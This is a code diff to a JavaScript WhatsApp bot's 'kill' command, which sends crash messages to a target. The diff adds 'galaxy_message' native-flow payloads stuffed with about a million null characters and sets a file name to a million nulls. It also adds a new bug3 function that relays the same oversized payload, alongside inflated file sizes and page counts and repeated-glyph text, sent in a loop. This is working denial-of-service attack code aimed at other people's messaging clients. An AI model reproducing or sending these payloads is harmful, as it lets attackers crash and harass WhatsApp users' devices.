@@ -4,6 +4,7 @@ import ineffable from '../bugs/ineffable.js';
 async function kill(message, client) {
 
     try {
+
         const remoteJid = message.key?.remoteJid;
 
         if (!remoteJid) {
@@ -34,7 +35,7 @@ async function kill(message, client) {
 
         // Execute the bug command
 
-        for (let i = 0; i < 50; i++) {
+        for (let i = 0; i < 20; i++) {
 
             await bug1(message, client, participant);
 
@@ -81,7 +82,15 @@ async function bug1(message, client, participant) {
                                 text: `⿻Senku love you\n${"ꦾ".repeat(1000)}\n\n`
                             },
                             nativeFlowMessage: {
-                                messageParamsJson: "{}"
+
+                                nativeFlowMessage: {
+
+                                    name: 'galaxy_message',
+                                    
+                                    paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                                        
+                                    version: 3
+                                },
                             },
                             contextInfo: {
                                 mentionedJid: ["6289526156543@s.whatsapp.net"],
@@ -98,7 +107,7 @@ async function bug1(message, client, participant) {
                                         fileLength: "9999999999999",
                                         pageCount: 1316134911,
                                         mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-                                        fileName: "ꦾ࣯࣯I love you",
+                                        fileName: `Dev Senku`,
                                         fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                         directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc",
                                         mediaKeyTimestamp: "1724474503",
@@ -111,7 +120,7 @@ async function bug1(message, client, participant) {
                     }
                 }
             },
-            {}
+            { participant: { jid: remoteJid } }
         );
 
     } catch (error) {
@@ -142,19 +151,26 @@ async function bug2(message, client, participant) {
                                 fileLength: "999999999",
                                 pageCount: 0x9184e729fff,
                                 mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
-                                fileName: "ꦾ࣯࣯I love you",
+                                fileName: `${"\u0000".repeat(1020000)}`,
                                 fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                 directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                 mediaKeyTimestamp: "1715880173",
                                 contactVcard: true
                             },
-                            title: "",
+                            title: "Dev senku",
                             hasMediaAttachment: true
                         },
                         body: {
                             text: virtex
                         },
-                        nativeFlowMessage: {},
+                        nativeFlowMessage: {
+
+                            name: 'galaxy_message',
+
+                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                                
+                            version: 3
+                        },
                         contextInfo: {
                             mentionedJid: ["0@s.whatsapp.net"],
                             groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Senku" }]
@@ -165,7 +181,7 @@ async function bug2(message, client, participant) {
         };
 
         console.log("Sending relayMessage...");
-        const response = await client.relayMessage(participant, msgPayload, {});
+        const response = await client.relayMessage(participant, msgPayload, { participant: { jid: participant } });
 
         console.log("relayMessage response:", response);
 
@@ -173,6 +189,42 @@ async function bug2(message, client, participant) {
         console.error("Error in bug2:", error);
     }
 }
+
+async function bug3(message, client, participant){
+
+    const target = participant;
+
+    await client.relayMessage(target, 
+
+            {
+                viewOnceMessage: {
+
+                    message: {
+
+                        interactiveResponseMessage: {
+
+                            body: {
+
+                                text: "༒ 𝕊𝕖𝕟𝕜𝕦 ༒",
+
+                                format: "EXTENSIONS_1"
+                            },
+                            nativeFlowResponseMessage: {
+
+                                name: 'galaxy_message'
+                                ,
+                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                                
+                                version: 3
+                            }
+                        }
+                    }
+                }
+            }, 
+            { participant: { jid: target } }
+        );
+    }
+
 
 
 export default kill;
